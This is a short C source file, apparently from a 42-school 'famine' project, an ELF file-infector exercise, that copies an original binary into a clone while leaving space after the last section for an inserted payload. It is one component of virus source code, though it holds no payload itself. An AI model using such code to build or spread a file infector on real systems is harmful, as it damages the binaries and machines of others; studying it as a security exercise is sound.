/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   copy_to_clone.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/13 14:58:36 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/19 00:41:34 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "utils.h"
#include "errors.h"

static bool	copy_until_end_of_last_sect(const struct famine food, size_t end_of_last_section)
{
	void	*original = safe_accessor(0, end_of_last_section, food.original_safe);
	void	*clone    = safe_accessor(0, end_of_last_section, food.clone_safe);

	if (!original) return errors(ERR_FILE, _ERR_NO_ORIGINAL_FILE_BEGIN);
	if (!clone) return errors(ERR_FILE, _ERR_NO_CLONE_FILE_BEGIN);

	ft_memcpy(clone, original, end_of_last_section);
	return (true);
}

static bool	copy_after_payload(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size)
{
	const size_t	size_after_last_sect = original_size - end_last_sect;
	void		*original = safe_accessor(end_last_sect, size_after_last_sect, food.original_safe);
	void		*clone    = safe_accessor(end_last_sect + shift_amount, size_after_last_sect, food.clone_safe);

	if (!original) return errors(ERR_FILE, _ERR_NO_ORIGINAL_FILE_END);
	if (!clone) return errors(ERR_FILE, _ERR_NO_CLONE_FILE_END);

	ft_memcpy(clone, original, size_after_last_sect);
	return true;
}

bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size)
{
	if (!copy_until_end_of_last_sect(food, end_last_sect)
	|| !copy_after_payload(food, end_last_sect, shift_amount, original_size))
	{
		return errors(ERR_THROW, _ERR_COPY_TO_CLONE);
	}
	return true;
}
